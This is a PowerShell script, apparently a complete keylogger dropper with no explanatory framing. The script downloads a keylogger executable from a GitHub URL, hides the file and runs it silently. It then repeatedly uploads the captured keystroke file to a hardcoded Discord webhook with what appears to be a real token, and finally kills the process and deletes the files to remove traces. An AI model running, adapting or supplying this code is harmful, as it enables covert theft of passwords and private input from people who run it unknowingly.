# Suppress errors and debug lines
$ErrorActionPreference = "SilentlyContinue"

# Download the executable from the GitHub URL
$downloadPath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads\keylogger.exe')
$textFilePath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads\recorded_sequence.txt')

Invoke-WebRequest -Uri 'https://github.com/muratcx/PythonProjects/raw/main/keylogger/dist/keylogger.exe' -OutFile $downloadPath

# Check if the download was successful
if (Test-Path $downloadPath) {
    # Set the "Hidden" attribute to "True" to hide the file
    Set-ItemProperty -Path $downloadPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
    # Execute the downloaded executable
    Start-Process -FilePath $downloadPath -NoNewWindow
    # Define the Discord webhook URL
    $webhookUrl = "https://discord.com/api/webhooks/1152705027098554478/HtWHmlFBKuYybSyaot6-5Sb_6VbxQNiTnPf9yDMru5OMcvv1UAp-HJnu_0UMTcactDOZ"

    # Function to send a file to Discord using a webhook and log the response
    function Send-FileToDiscord {
        param (
            [string]$WebhookUrl,
            [string]$FilePath
        )

        # Define the boundary for multipart/form-data
        $boundary = [System.Guid]::NewGuid().ToString()

        # Build the multipart/form-data body
        $body = [System.Text.StringBuilder]@{}
        $body.AppendLine("--$boundary")
        $body.AppendLine('Content-Disposition: form-data; name="file"; filename="' + (Get-Item $FilePath).Name + '"')
        $body.AppendLine('Content-Type: application/octet-stream')
        $body.AppendLine()
        $body.AppendLine([System.IO.File]::ReadAllText($FilePath))
        $body.AppendLine("--$boundary--")

        # Convert the body to bytes
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body.ToString())

        # Create a web request
        $request = [System.Net.WebRequest]::Create($WebhookUrl)
        $request.Method = "POST"
        $request.ContentType = "multipart/form-data; boundary=$boundary"
        $request.ContentLength = $bodyBytes.Length

        # Get the request stream and write the body
        $requestStream = $request.GetRequestStream()
        $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
        $requestStream.Close()

        # Get the response
        $response = $request.GetResponse()
        $responseStream = $response.GetResponseStream()
        $reader = New-Object System.IO.StreamReader($responseStream)
        $responseText = $reader.ReadToEnd()
        $reader.Close()
        $responseStream.Close()
        $response.Close()

        # Log the response from Discord
        Write-Host "Discord Webhook Response: $responseText"
    }

 # Send the file to Discord a maximum of 10 times
$maxSendCount = 10     # Maximum number of times to send the file
$sendCount = 0          # Initialize the send count

while ($sendCount -lt $maxSendCount) {
    # Upload the text file to Discord
    Send-FileToDiscord -WebhookUrl $webhookUrl -FilePath $textFilePath

    # Increase the send count
    $sendCount++

    # Sleep for 30 seconds
    Start-Sleep -Seconds 30
}
# After sending files to Discord 10 times, delete the text file if it still exists
if (Test-Path -Path $textFilePath) {
    # Close the 'keylogger.exe' process if it's running
    Get-Process -Name 'keylogger' | ForEach-Object { Stop-Process -Id $_.Id -Force }

    Remove-Item -Path $textFilePath -Force -ErrorAction SilentlyContinue
    Write-Host "Deleted $textFilePath"
} else {
    Write-Host "Text file not found at $textFilePath"
}

# Delete the 'keylogger.exe' file from the Downloads folder
$exeFilePath = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads\keylogger.exe')
if (Test-Path -Path $exeFilePath) {
    Remove-Item -Path $exeFilePath -Force -ErrorAction SilentlyContinue
    Write-Host "Deleted $exeFilePath"
} else {
    Write-Host "Exe file not found at $exeFilePath"
}
} else {
    Write-Host 'Download failed. Please check the GitHub URL and try again.'
}
